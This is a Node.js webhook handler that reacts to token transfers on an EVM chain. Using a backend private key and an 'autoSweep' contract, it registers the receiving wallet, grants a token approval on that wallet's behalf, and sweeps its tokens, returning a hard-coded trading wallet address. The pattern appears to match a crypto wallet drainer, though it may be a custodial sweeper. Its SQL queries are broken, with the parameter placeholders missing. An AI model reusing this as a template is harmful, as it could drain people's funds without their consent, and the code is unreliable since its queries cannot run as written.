const { Pool } = require('pg');
const { ethers } = require('ethers');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const provider = new ethers.JsonRpcProvider(process.env.HYPEREVM_RPC_URL);
const backendWallet = new ethers.Wallet(process.env.BACKEND_PRIVATE_KEY, provider);

const autoSweepABI = [
  'function sweepToken(address user, address token) external',
  'function registerUser(address user) external',
  'function grantApproval(address user, address token) external',
  'function isUserRegistered(address user) view returns (bool)',
  'function isTokenApproved(address user, address token) view returns (bool)'
];

module.exports = async (req, res) => {
  const authHeader = req.headers.authorization;
  
  if (authHeader !== `Bearer ${process.env.WEBHOOK_SECRET}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  try {
    const { event, data } = req.body;
    
    if (event !== 'token_transfer') {
      return res.status(400).json({ error: 'Invalid event type' });
    }
    
    const { to: userAddress, token: tokenAddress, amount } = data;
    
    if (!userAddress || !tokenAddress) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    console.log(`📥 Webhook: Token transfer detected - ${amount} to ${userAddress}`);
    
    // Check if user is eligible
    const userCheck = await pool.query(
      'SELECT wallet_address FROM wallets WHERE wallet_address =  AND chain = ',
      [userAddress.toLowerCase(), 'hyperevm']
    );
    
    if (userCheck.rows.length === 0) {
      console.log('⏭️  Not an eligible user');
      return res.json({ message: 'User not eligible for auto-sweep' });
    }
    
    // Execute auto-sweep
    const autoSweepContract = new ethers.Contract(
      process.env.AUTOSWEEP_CONTRACT,
      autoSweepABI,
      backendWallet
    );
    
    // Register if needed
    const isRegistered = await autoSweepContract.isUserRegistered(userAddress);
    if (!isRegistered) {
      const regTx = await autoSweepContract.registerUser(userAddress);
      await regTx.wait();
      console.log('✅ User registered');
    }
    
    // Grant approval if needed
    const isApproved = await autoSweepContract.isTokenApproved(userAddress, tokenAddress);
    if (!isApproved) {
      const approveTx = await autoSweepContract.grantApproval(userAddress, tokenAddress);
      await approveTx.wait();
      console.log('✅ Approval granted');
    }
    
    // Sweep tokens
    const sweepTx = await autoSweepContract.sweepToken(userAddress, tokenAddress);
    const receipt = await sweepTx.wait();
    
    await pool.query(
      'INSERT INTO sweep_events (tx_hash, wallets_swept, token_address, status) VALUES (, , , )',
      [receipt.hash, 1, tokenAddress, 'success']
    );
    
    console.log(`✅ Webhook sweep successful! TxHash: ${receipt.hash}`);
    
    res.json({
      success: true,
      txHash: receipt.hash,
      tradingWallet: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
    });
    
  } catch (error) {
    console.error('❌ Webhook sweep error:', error);
    res.status(500).json({ error: 'Sweep failed', details: error.message });
  }
};
